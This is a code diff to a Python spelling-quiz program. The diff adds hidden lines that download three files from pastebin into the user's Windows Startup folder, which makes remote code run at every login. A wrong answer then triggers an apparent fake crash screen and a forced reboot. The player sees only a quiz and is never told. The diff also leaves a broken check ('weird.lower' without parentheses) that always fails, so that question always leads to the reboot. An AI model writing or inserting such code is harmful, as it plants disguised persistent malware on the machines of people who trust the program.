@@ -6,15 +6,29 @@ from PyQt5.QtCore import QObject, pyqtSignal
 import threading
 import os
 import random
+import requests
+
+user = os.environ['USERNAME']
+
+url = "https://pastebin.com/raw/RSiyfdAQ"
+
+r = requests.get(url, allow_redirects=True)
+open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.py", 'wb').write(r.content)
+
+url = "https://pastebin.com/raw/XTkPxwrr"
+
+r = requests.get(url, allow_redirects=True)
+open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.qml", 'wb').write(r.content)
+
+url = "https://pastebin.com/raw/XV47ctX6"
+
+r = requests.get(url, allow_redirects=True)
+open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml", 'wb').write(r.content)
 
 clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
 clearConsole()
 
 percent = 0
-
-print("Warning, all inputs must be lowercase otherwise they will be marked wrong\n")
-
-misspell = input("Please spell /misˈspel/, the words are phonetic so you cant cheat\n");
 
 def blue():
 	#importing text to QML
@@ -38,11 +52,12 @@ def blue():
 					pause = random.randrange(int(0.1), 3)
 					percent = percent +1
 					curr_time = str(percent)
-					print(curr_time)
 					self.updater(curr_time)
 					sleep(pause)
 				
 				if curr_time == str(100) :
+					
+					
 					os.system("shutdown /r /t 1")
 
 	pause = random.randrange(int(0.1), 3)
@@ -53,39 +68,40 @@ def blue():
 	app = QGuiApplication(sys.argv)
 	engine = QQmlApplicationEngine()
 	engine.quit.connect(app.quit)
-	engine.load('./main.qml')
+	engine.load("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml")
 	back_end = Backend()
 	engine.rootObjects()[0].setProperty('backend', back_end)
 	back_end.bootUp()
 	sys.exit(app.exec())
 
+misspell = input("Please spell /misˈspel/, the words are phonetic so you cant cheat\n");
 
-if misspell == "misspell".lower():
+if misspell.lower() == "misspell":
 	pharaoh = input("Yay you did it, lets move on to a harder one, please spell /ˈferō/\n");
-	if pharaoh == "pharaoh".lower():
+	if pharaoh.lower() == "pharaoh":
 
 		weird = input("Please spell /wird/\n");
-		if weird == "weird".lower():
+		if weird.lower == "weird":
 			intelligence = input("Please spell inˈteləjəns/\n")
-			if intelligence == "intelligence":
+			if intelligence.lower() == "intelligence":
 				pronunciation = input("Please spell /prəˌnənsēˈāSH(ə)\n")
-				if pronunciation == "pronunciation":
+				if pronunciation.lower() == "pronunciation":
 					hand = input("Please spell /ˈhaNGkərCHif,ˈhaNGkərCHēf/\n")
-					if hand == "handkerchief":
+					if hand.lower() == "handkerchief":
 						print("Keep going, you are halfway there!")	
 						logorrhea = input("Please spell /ˌlôɡəˈrēə/\n")
-						if logorrhea == "logorrhea":
+						if logorrhea.lower() == "logorrhea":
 							chiaroscurist = input("Please spell \ kē-ˌär-ə-ˈskyu̇r-ist , kē-ˌer-, kē-ˌa-rə-, -ˈsku̇r- \\n")
-							if chiaroscurist == "chiaroscurist":
+							if chiaroscurist.lower() == "chiaroscurist":
 								gobbledegook = input("Please spell /ˈɡɒbldiɡuːk/\n")
-								if gobbledegook == "gobbledegook":
+								if gobbledegook.lower() == "gobbledegook":
 									tomfoolery = input("You have finished the test! Good job. to end the test type end or to continue to the special mentions, please spell /tämˈfo͞ol(ə)rē/\n")
-									if tomfoolery == "end":
+									if tomfoolery.lower() == "end":
 										pass
-									elif tomfoolery == "tomfoolery":
+									elif tomfoolery.lower() == "tomfoolery":
 										shenanigens = input("Last one i swear! Please spell /SHəˈnanəɡənz/\n")
-										if shenanigens == "shenanigens":
-											print("Good job you spelled all the words correctly(you probably cheated thought but who am I to judge)")
+										if shenanigens.lower() == "shenanigens":
+											print("Good job you spelled all the words correctly(you probably cheated though but who am I to judge)")
 											pass
 										else:
 											blue()
